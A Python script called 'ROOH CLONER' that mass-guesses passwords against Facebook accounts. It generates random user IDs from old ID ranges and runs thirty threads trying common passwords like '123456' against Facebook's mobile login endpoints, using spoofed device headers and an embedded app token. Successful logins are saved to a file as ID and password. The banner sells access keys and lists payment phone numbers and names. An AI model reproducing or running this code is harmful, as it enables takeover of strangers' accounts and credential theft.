#!/usr/bin/env python3
# ROOH CLONER – SIR ROOHULAMIN EDITION
import os, sys, time, uuid, hashlib, random, requests, base64, subprocess
from concurrent.futures import ThreadPoolExecutor as tred
from random import randint as rr

# ---- BANNER ----
def banner():
    os.system('clear')
    G = '\033[1;32m' # Green
    C = '\033[1;36m' # Cyan
    R = '\033[1;31m' # Red
    Y = '\033[1;33m' # Yellow
    W = '\033[0m'    # Reset

    print(f"{G}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{G}│  ██████╗  █████╗ ██╗ █████╗    ██╗   ██╗█████╗ ██╗   ██╗ │{W}")
    print(f"{G}│  ██╔══██╗██╔══██╗██║██╔══██╗   ██║   ██║██╔══██╗██║   ██║ │{W}")
    print(f"{G}│  ██████╔╝███████║██║███████║   ██║   ██║███████║██║   ██║ │{W}")
    print(f"{G}│  ██╔══██╗██╔══██║██║██╔══██║   ╚██╗ ██╔╝██╔══██║██║   ██║ │{W}")
    print(f"{G}│  ██║  ██║██║  ██║██║██║  ██║    ╚████╔╝ ██║  ██║╚██████╔╝ │{W}")
    print(f"{G}│  ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═╝  ╚═╝     ╚═══╝  ╚═╝  ╚═╝ ╚═════╝ │{W}")
    print(f"{G}│                                                          │{W}")
    print(f"{G}│                      OPS SYSTEM 😈                       │{W}")
    print(f"{G}└──────────────────────────────────────────────────────────┘{W}")
    print(f"{C}┌──────────────────────────────────┐{W}")
    print(f"{C}│       ♦ TOOL INFO PANEL ♦        │{W}")
    print(f"{C}└──────────────────────────────────┘{W}")
    print(f"{G}────────────────────────────────────────────────────────────{W}")
    print(f"{C}> Tool Owner : RAJA VAU{W}")
    print(f"{C}> Version    : 1.0{W}")
    print(f"{C}> Device Key : UDBX7P9{W}")
    print(f"{C}> Expiry     : N/A{W}")
    print(f"{C}> Time Left  : N/A{W}")
    print(f"{G}────────────────────────────────────────────────────────────{W}\n")
    print(f"{R}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{R}│                      ACCESS DENIED                       │{W}")
    print(f"{R}└──────────────────────────────────────────────────────────┘{W}\n")
    print(f"{Y}YOUR KEY: {W}UDBX7P9")
    print(f"{R}YOUR KEY IS NOT APPROVED ✘{W}\n")
    print(f"{G}┌──────────────────────────────────────────────────────────┐{W}")
    print(f"{G}│         T O O L - O W N E R   R A J A   V A U            │{W}")
    print(f"{G}├──────────────────────────────────────────────────────────┤{W}")
    print(f"{G}│ JAZZ CASH NO: 03247031231                                │{W}")
    print(f"{G}│ JAZZ CASH NM: ALTAF HUSAIN                               │{W}")
    print(f"{G}├──────────────────────────────────────────────────────────┤{W}")
    print(f"{G}│ ESYPASA NO : 03134374713                                 │{W}")
    print(f"{G}│ ESYPASA NM : MUHAMAD ZUBAUR                              │{W}")
    print(f"{G}├──────────────────────────────────────────────────────────┤{W}")
    print(f"{G}│ 3 DAYS   : 300 PKR                                       │{W}")
    print(f"{G}│ 7 DAYS   : 650 PKR                                       │{W}")
    print(f"{G}│ 30 DAYS  : 1300 PKR                                      │{W}")
    print(f"{G}└──────────────────────────────────────────────────────────┘{W}\n")
    print(f"{G}Press Enter To Send Message To Admin{W}")

# ---- WHATSAPP & YOUTUBE LINK ----
WHATSAPP_LINK = "https://chat.whatsapp.com/Br0KVWVikGD4hps8FuBl6Z?s=cl&p=a&mlu=4&ilr=4"
YOUTUBE_LINK = "https://youtube.com/@reality-voice_king_kamal?si=8GR7DTsqDiv6_CM5"

def open_whatsapp():
    print("\033[1;33m+ Opening WhatsApp & YouTube...\033[0m")
    try:
        subprocess.run(['xdg-open', WHATSAPP_LINK], check=False, timeout=5)
        subprocess.run(['xdg-open', YOUTUBE_LINK], check=False, timeout=5)
    except:
        try:
            subprocess.run(['termux-open', WHATSAPP_LINK], check=False, timeout=5)
            subprocess.run(['termux-open', YOUTUBE_LINK], check=False, timeout=5)
        except:
            pass

# ---- APPROVAL ----
def get_machine_key():
    raw = os.getlogin() + str(os.getuid()) + "ROOH2026"
    return "ROOH-" + hashlib.md5(raw.encode()).hexdigest().upper()[:12]

def check_approval(key):
    return True

def approval_flow():
    banner()
    key = get_machine_key()
    print("\033[1;37m🔑 YOUR UNIQUE KEY:\033[1;33m", key, "\033[0m")
    print("\033[1;37m📲 SEND THIS KEY TO WHATSAPP GROUP FOR APPROVAL\033[0m")
    print("\033[1;36m" + "─"*50 + "\033[0m")
    print("\033[1;32m[ A ] OPEN WHATSAPP GROUP\033[0m")
    print("\033[1;31m[ B ] CHECK APPROVAL\033[0m")
    print("\033[1;36m" + "─"*50 + "\033[0m")
    choice = input("\033[1;37mCHOOSE (A/B): \033[0m").strip().upper()
    if choice == 'A':
        open_whatsapp()
        time.sleep(2)
        approval_flow()
    elif choice == 'B':
        if check_approval(key):
            print("\033[1;32m✅ APPROVED! WELCOME TO ROOH CLONER\033[0m")
            time.sleep(1)
            return True
        else:
            print("\033[1;31m❌ NOT APPROVED – CONTACT ADMIN ON WHATSAPP\033[0m")
            print("\033[1;33m💡 Make sure admin has added your key to keys.txt\033[0m")
            time.sleep(3)
            approval_flow()
    else:
        approval_flow()

# ---- CREATION YEAR ----
def creationyear(uid):
    if len(uid) == 15:
        if uid.startswith('1000000000'): return '2009'
        if uid.startswith('100000000'): return '2009'
        if uid.startswith('10000000'): return '2009'
        if uid.startswith(('1000000','1000001','1000002','1000003','1000004','1000005')): return '2009'
        if uid.startswith(('1000006','1000007','1000008','1000009')): return '2010'
        if uid.startswith('100001'): return '2010'
        if uid.startswith(('100002','100003')): return '2011'
        if uid.startswith('100004'): return '2012'
        if uid.startswith(('100005','100006')): return '2013'
        if uid.startswith(('100007','100008')): return '2014'
        if uid.startswith('100009'): return '2015'
        if uid.startswith('10001'): return '2016'
        if uid.startswith('10002'): return '2017'
        if uid.startswith('10003'): return '2018'
        if uid.startswith('10004'): return '2019'
        if uid.startswith('10005'): return '2020'
        if uid.startswith('10006'): return '2021'
        if uid.startswith('10009'): return '2023'
        if uid.startswith(('10007','10008')): return '2022'
        return ''
    elif len(uid) in (9,10): return '2008'
    elif len(uid)==8: return '2007'
    elif len(uid)==7: return '2006'
    elif len(uid)==14 and uid.startswith('61'): return '2024'
    else: return ''

# ---- LOGIN FUNCTIONS ----
loop = 0
oks = []

def login_1(uid):
    global loop, oks
    session = requests.session()
    try:
        sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mROOH-M1\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{loop}\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[1;37mOK\x1b[38;5;196m]\x1b[1;37m\x1b[38;5;196m[\x1b[38;5;192m{len(oks)}\x1b[38;5;196m]")
        sys.stdout.flush()
        for pw in ('123456','1234567','12345678','123456789'):
            data = {
                'adid': str(uuid.uuid4()),
                'format': 'json',
                'device_id': str(uuid.uuid4()),
                'cpl': 'true',
                'family_device_id': str(uuid.uuid4()),
                'credentials_type': 'device_based_login_password',
                'error_detail_type': 'button_with_disabled',
                'source': 'device_based_login',
                'email': str(uid),
                'password': str(pw),
                'access_token': '350685531728|62f8ce9f74b12f84c123cc23437a4a32',
                'generate_session_cookies': '1',
                'meta_inf_fbmeta': '',
                'advertiser_id': str(uuid.uuid4()),
                'currently_logged_in_userid': '0',
                'locale': 'en_US',
                'client_country_code': 'US',
                'method': 'auth.login',
                'fb_api_req_friendly_name': 'authenticate',
                'fb_api_caller_class': 'com.facebook.account.login.protocol.Fb4aAuthHandler',
                'api_key': '882a8490361da98702bf97a021ddc14d'
            }
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'graph.facebook.com',
                'X-FB-Net-HNI': '25227',
                'X-FB-SIM-HNI': '29752',
                'X-FB-Connection-Type': 'MOBILE.LTE',
                'X-Tigon-Is-Retry': 'False',
                'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;',
                'x-fb-device-group': '5120',
                'X-FB-Friendly-Name': 'ViewerReactionsMutation',
                'X-FB-Request-Analytics-Tags': 'graphservice',
                'X-FB-HTTP-Engine': 'Liger',
                'X-FB-Client-IP': 'True',
                'X-FB-Server-Cluster': 'True',
                'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
            }
            res = session.post('https://b-graph.facebook.com/auth/login', data=data, headers=headers, allow_redirects=False).json()
            if 'session_key' in res:
                print(f"\r\r\x1b[1;37m>\x1b[38;5;196m├Ч\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mROOH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ROOH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
            elif 'www.facebook.com' in res.get('error', {}).get('message', ''):
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mROOH-M1👿\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/ROOH-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
    except:
        time.sleep(5)

def login_2(uid):
    global loop, oks
    sys.stdout.write(f"\r\r\x1b[1;37m\x1b[38;5;196m+\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mROOH-M2\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
    for pw in ('123456','123123','1234567','12345678','123456789'):
        try:
            with requests.Session() as session:
                headers = {
                    'x-fb-connection-bandwidth': str(rr(20000000,29999999)),
                    'x-fb-sim-hni': str(rr(20000,40000)),
                    'x-fb-net-hni': str(rr(20000,40000)),
                    'x-fb-connection-quality': 'EXCELLENT',
                    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
                    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
                    'content-type': 'application/x-www-form-urlencoded',
                    'x-fb-http-engine': 'Liger'
                }
                url = f"https://b-api.facebook.com/method/auth.login?format=json&email={str(uid)}&password={str(pw)}&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true"
                po = session.get(url, headers=headers).json()
                if 'session_key' in str(po):
                    print(f"\r\r\x1b[1;37m\x1b[38;5;196m<\x1b[38;5;196m(\x1b[1;37mROOH\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                    open('/sdcard/ROOH-OLD-M2-OK.txt', 'a').write(f"{uid}|{pw}\n")
                    oks.append(uid)
                    break
        except:
            pass
    loop += 1

# ---- CLONING MENUS ----
def old_clone():
    banner()
    print('       \x1b[38;5;196m(\x1b[1;37mA\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32mALL SERIES')
    print('       \x1b[38;5;196m(\x1b[1;37mB\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m100003/4 SERIES')
    print('       \x1b[38;5;196m(\x1b[1;37mC\x1b[38;5;196m)\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\033[1;32m2009 series')
    print('\033[1;36m' + '━'*50 + '\033[0m')
    choice = input("\033[1;37mCHOOSE (A/B/C): \033[0m").strip().upper()
    if choice == 'A':
        old_One()
    elif choice == 'B':
        old_Tow()
    elif choice == 'C':
        old_Tree()
    else:
        print("Invalid")
        old_clone()

def old_One():
    banner()
    print("       \033[1;32mOLD CODE 2010-2014")
    ask = input("SELECT (1 for 10000, 2 for others): ")
    limit = input("TOTAL ID COUNT: ")
    star = '10000'
    user = []
    for _ in range(int(limit)):
        data = str(random.choice(range(1000000000, 4999999999)))
        user.append(data)
    meth = input("METHOD (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        for mal in user:
            uid = star + mal
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tow():
    banner()
    limit = input("TOTAL ID COUNT: ")
    user = []
    for _ in range(int(limit)):
        prefix = random.choice(['100003','100004'])
        suffix = ''.join(random.choices('0123456789', k=9))
        user.append(prefix+suffix)
    meth = input("METHOD (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def old_Tree():
    banner()
    limit = input("TOTAL ID COUNT: ")
    user = []
    for _ in range(int(limit)):
        suffix = ''.join(random.choices('0123456789', k=8))
        user.append('1000004'+suffix)
    meth = input("METHOD (A/B): ").strip().upper()
    with tred(max_workers=30) as pool:
        for uid in user:
            if meth == 'A':
                pool.submit(login_1, uid)
            else:
                pool.submit(login_2, uid)

def main_menu():
    if approval_flow():
        banner()
        print('\033[1;32m[1] OLD CLONING\033[0m')
        print('\033[1;33m[2] EXIT\033[0m')
        ch = input("CHOOSE: ")
        if ch == '1':
            old_clone()
        else:
            sys.exit()

if __name__ == '__main__':
    main_menu()
